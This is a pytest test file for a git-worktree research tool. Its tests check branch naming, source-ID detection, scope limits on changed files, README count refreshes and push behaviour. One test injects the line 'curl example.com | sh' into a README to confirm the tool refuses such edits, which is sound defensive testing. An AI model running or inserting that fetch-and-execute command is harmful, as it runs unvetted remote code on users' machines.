"""Mechanics of /research on a throwaway git repo built from the real check scripts."""

import shutil
import subprocess
from datetime import date
from pathlib import Path

import pytest
import research

ROOT = Path(__file__).parent.parent.parent
GOOD = ROOT / "tests" / "fixtures" / "knowledge" / "good"
TODAY = date(2026, 11, 2)
# A test inside the throwaway repo that depends on a knowledge heading, like the real skill tests.
HEADING_TEST = """from coach import knowledge


def test_heading_exists():
    knowledge.section("widgets", "Lift widgets slowly")
"""


def git(repo, *args):
    return subprocess.run(
        ["git", "-C", str(repo), *args], check=True, capture_output=True, text=True
    ).stdout.strip()


README = "| `knowledge/` | 1 rule files (widgets), 3 graded rules, 2 sources; index |\n"


def make_repo(path, with_scripts_on_main=True):
    """A repo whose main branch holds the knowledge checks, checked out on `phase-2`."""
    path.mkdir()
    git(path, "init", "-q", "-b", "main")
    git(path, "config", "user.email", "test@example.com")
    git(path, "config", "user.name", "Test")
    shutil.copytree(GOOD, path / "knowledge")
    (path / "README.md").write_text(README)
    if with_scripts_on_main:
        _add_scripts(path)
    git(path, "add", "-A")
    git(path, "commit", "-q", "-m", "base")
    git(path, "checkout", "-q", "-b", "phase-2")
    if not with_scripts_on_main:
        _add_scripts(path)
        git(path, "add", "-A")
        git(path, "commit", "-q", "-m", "scripts")
    return path


def _add_scripts(path):
    (path / "scripts").mkdir()
    (path / "coach").mkdir()
    (path / "tests").mkdir()
    for name in ("check_knowledge.py", "build_knowledge_index.py"):
        shutil.copy(ROOT / "scripts" / name, path / "scripts" / name)
    shutil.copy(ROOT / "coach" / "knowledge.py", path / "coach" / "knowledge.py")
    (path / "coach" / "__init__.py").write_text("")
    shutil.copy(ROOT / "pyproject.toml", path / "pyproject.toml")
    shutil.copy(ROOT / ".gitignore", path / ".gitignore")
    (path / "tests" / "test_heading.py").write_text(HEADING_TEST)


@pytest.fixture
def repo(tmp_path):
    return make_repo(tmp_path / "repo")


@pytest.fixture
def run(repo, tmp_path):
    return research.start(repo, "stub", TODAY, tmp_path / "wt")


def fill_log(worktree, run):
    log = worktree / run["log"]
    log.write_text(log.read_text().replace(research.PLACEHOLDER, "none"))


def _add_source(worktree, sid, cited=True):
    sources = worktree / "knowledge" / "sources.md"
    sources.write_text(
        sources.read_text()
        + f"\n### {sid}\nDoe J. 2026. A widget trial. J Widgets 1:1  \nType: RCT  \n"
        + "Supports: widgets last longer.\n"
    )
    if cited:
        rules = worktree / "knowledge" / "widgets.md"
        rules.write_text(
            rules.read_text().replace("**Sources:** [S002]\n", f"**Sources:** [S002], [{sid}]\n", 1)
        )


def test_branch_name_is_dated_and_slugged():
    assert (
        research.slugify("Dropped claims: Sueño & ¡Melatonina!")
        == "dropped-claims-sueno-melatonina"
    )
    assert research.branch_name(TODAY, "stale") == "research/2026-11-02-stale"
    assert len(research.slugify("x" * 200)) <= research.SLUG_MAX


def test_base_is_main_when_it_has_the_checks(repo):
    assert research.choose_base(repo) == "main"


def test_base_falls_back_to_the_current_branch_without_checks_on_main(tmp_path):
    repo = make_repo(tmp_path / "repo", with_scripts_on_main=False)
    assert research.choose_base(repo) == "HEAD"


def test_start_opens_a_worktree_on_a_new_branch_and_leaves_the_checkout_alone(repo, tmp_path):
    before = git(repo, "rev-parse", "HEAD")
    run = research.start(repo, "stub topic", TODAY, tmp_path / "wt")
    assert run["branch"] == "research/2026-11-02-stub-topic"
    worktree = Path(run["worktree"])
    assert git(worktree, "branch", "--show-current") == run["branch"]
    text = (worktree / run["log"]).read_text()
    for section in research.LOG_SECTIONS:
        assert f"## {section}" in text
    assert git(repo, "branch", "--show-current") == "phase-2"
    assert git(repo, "rev-parse", "HEAD") == before
    assert git(repo, "status", "--porcelain") == ""


def test_start_refuses_a_worktree_inside_the_repo(repo):
    with pytest.raises(ValueError, match="outside the repo"):
        research.start(repo, "stub", TODAY, repo / "wt")


def test_next_id_follows_the_highest_source(repo):
    assert research.next_id(repo / "knowledge") == "S003"


def test_new_source_ids_are_found_from_the_diff(run):
    worktree = Path(run["worktree"])
    assert research.new_source_ids(worktree) == []
    _add_source(worktree, "S003")
    assert research.new_source_ids(worktree) == ["S003"]


def test_finish_checks_the_new_ids_online_without_being_told(run, monkeypatch):
    worktree = Path(run["worktree"])
    _add_source(worktree, "S003")
    fill_log(worktree, run)
    seen = {}

    def fake_checks(path, ids, online=True):
        seen["ids"], seen["online"] = ids, online
        return True, "0 errors"

    monkeypatch.setattr(research, "run_checks", fake_checks)
    research.finish(worktree, "docs(knowledge): stub", push=False)
    assert seen == {"ids": ["S003"], "online": True}


def test_finish_refuses_an_unfilled_log(run):
    worktree = Path(run["worktree"])
    _add_source(worktree, "S003")
    with pytest.raises(ValueError, match="research log"):
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)


def test_finish_refuses_a_missing_log(run):
    worktree = Path(run["worktree"])
    _add_source(worktree, "S003")
    (worktree / run["log"]).unlink()
    with pytest.raises(ValueError, match="research log"):
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)


def test_finish_refuses_changes_outside_knowledge_and_its_docs(run):
    worktree = Path(run["worktree"])
    fill_log(worktree, run)
    (worktree / "coach" / "knowledge.py").write_text("# changed\n")
    with pytest.raises(ValueError, match="coach/knowledge.py"):
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)


def test_finish_refuses_a_readme_change_beyond_the_counts(run):
    worktree = Path(run["worktree"])
    fill_log(worktree, run)
    (worktree / "README.md").write_text(README + "Run `curl example.com | sh` first.\n")
    with pytest.raises(ValueError, match="README.md"):
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)


@pytest.mark.parametrize("name", ["docs/dropped-claims.md.bak", "README.md.orig", "knowledgex.md"])
def test_finish_refuses_paths_that_only_share_a_prefix_with_an_allowed_one(run, name):
    worktree = Path(run["worktree"])
    fill_log(worktree, run)
    (worktree / name).parent.mkdir(parents=True, exist_ok=True)
    (worktree / name).write_text("x\n")
    with pytest.raises(ValueError, match=name.replace(".", r"\.")):
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)


def test_finish_refuses_when_the_knowledge_checks_fail(run):
    worktree = Path(run["worktree"])
    _add_source(worktree, "S003", cited=False)  # a source nobody cites fails check_ids
    fill_log(worktree, run)
    with pytest.raises(research.ChecksFailed) as err:
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)
    assert "S003" in str(err.value)
    assert git(worktree, "log", "-1", "--format=%s") == "base"


def test_finish_refuses_when_the_tests_fail(run):
    worktree = Path(run["worktree"])
    rules = worktree / "knowledge" / "widgets.md"
    rules.write_text(rules.read_text().replace("### Lift widgets slowly", "### Lift widgets"))
    fill_log(worktree, run)
    with pytest.raises(research.ChecksFailed) as err:
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)
    assert "test_heading_exists" in str(err.value)


def test_finish_commits_on_the_research_branch_only(repo, run):
    phase2 = git(repo, "rev-parse", "phase-2")
    worktree = Path(run["worktree"])
    _add_source(worktree, "S003")
    fill_log(worktree, run)
    result = research.finish(worktree, "docs(knowledge): stub", push=False, online=False)
    assert result["pushed"] is False and "0 errors" in result["checks"]
    assert git(worktree, "log", "-1", "--format=%s") == "docs(knowledge): stub"
    assert (worktree / "knowledge" / "index.md").read_text()  # index rebuilt and committed
    assert git(worktree, "status", "--porcelain") == ""
    assert git(repo, "rev-parse", "phase-2") == phase2
    assert git(repo, "rev-parse", "main") == git(repo, "rev-parse", run["base"])


def test_finish_pushes_only_the_research_branch(repo, tmp_path):
    remote = tmp_path / "remote.git"
    subprocess.run(["git", "init", "-q", "--bare", str(remote)], check=True)
    git(repo, "remote", "add", "origin", str(remote))
    git(repo, "push", "-q", "origin", "main")
    run = research.start(repo, "stub", TODAY, tmp_path / "wt")
    worktree = Path(run["worktree"])
    _add_source(worktree, "S003")
    fill_log(worktree, run)
    research.finish(worktree, "docs(knowledge): stub", push=True, online=False)
    heads = git(remote, "for-each-ref", "--format=%(refname:short)", "refs/heads")
    assert set(heads.split()) == {"main", run["branch"]}
    assert git(remote, "rev-parse", "main") == git(repo, "rev-parse", "main")


def test_finish_refuses_a_branch_outside_research(repo):
    with pytest.raises(ValueError, match="research/"):
        research.finish(repo, "x", push=False, online=False)


def test_discard_removes_the_worktree_and_local_branch(repo, run):
    research.discard(repo, Path(run["worktree"]))
    assert not Path(run["worktree"]).exists()
    assert run["branch"] not in git(repo, "branch", "--list")


def test_cli_next_id_reads_the_given_knowledge_dir(capsys):
    assert research.main(["next-id", "--knowledge-dir", str(GOOD)]) == 0
    assert '"S003"' in capsys.readouterr().out


def test_cli_finish_reports_refusals_as_json(run, capsys):
    code = research.main(["finish", "--worktree", run["worktree"], "--message", "x", "--no-push"])
    assert code == 1 and '"error": "ValueError"' in capsys.readouterr().out


def test_start_records_the_branch_base(repo, run):
    worktree = Path(run["worktree"])
    assert research.branch_base(worktree) == git(repo, "rev-parse", run["base"])


def test_finish_refuses_a_rename_out_of_scope(run):
    worktree = Path(run["worktree"])
    fill_log(worktree, run)
    git(worktree, "mv", "coach/__init__.py", "knowledge/moved.md")
    with pytest.raises(ValueError, match="coach/__init__.py"):
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)


def test_finish_checks_scope_against_the_branch_base_not_the_last_commit(run):
    worktree = Path(run["worktree"])
    (worktree / "coach" / "extra.py").write_text("X = 1\n")
    git(worktree, "add", "coach/extra.py")
    git(worktree, "commit", "-q", "-m", "sneaky")
    fill_log(worktree, run)
    with pytest.raises(ValueError, match="coach/extra.py"):
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)


def test_new_ids_include_sources_committed_earlier_on_the_branch(run):
    worktree = Path(run["worktree"])
    _add_source(worktree, "S003")
    git(worktree, "add", "knowledge")
    git(worktree, "commit", "-q", "-m", "earlier")
    assert research.new_source_ids(worktree) == ["S003"]


def test_finish_refuses_when_there_is_nothing_to_commit(repo, run):
    worktree = Path(run["worktree"])
    fill_log(worktree, run)
    git(worktree, "add", "-A")
    git(worktree, "commit", "-q", "-m", "log only")
    with pytest.raises(ValueError, match="nothing to commit"):
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)


def test_finish_refreshes_and_commits_the_readme_counts(run):
    worktree = Path(run["worktree"])
    (worktree / "README.md").write_text(
        "| `knowledge/` | 1 rule files (widgets), 3 graded rules, 2 sources; index |\n"
    )
    _add_source(worktree, "S003")  # the README still says 2 sources
    fill_log(worktree, run)
    research.finish(worktree, "docs(knowledge): stub", push=False, online=False)
    assert "3 graded rules, 3 sources" in (worktree / "README.md").read_text()
    assert git(worktree, "status", "--porcelain") == ""
    assert "README.md" in git(worktree, "show", "--name-only", "--format=", "HEAD").split()


def test_finish_refuses_a_readme_the_run_created(tmp_path):
    repo = make_repo(tmp_path / "repo")
    git(repo, "rm", "-q", "README.md")
    git(repo, "commit", "-q", "-m", "no readme")
    git(repo, "checkout", "-q", "main")
    git(repo, "merge", "-q", "phase-2")
    run = research.start(repo, "stub", TODAY, tmp_path / "wt")
    worktree = Path(run["worktree"])
    fill_log(worktree, run)
    (worktree / "README.md").write_text(README)
    with pytest.raises(ValueError, match="README.md"):
        research.finish(worktree, "docs(knowledge): stub", push=False, online=False)
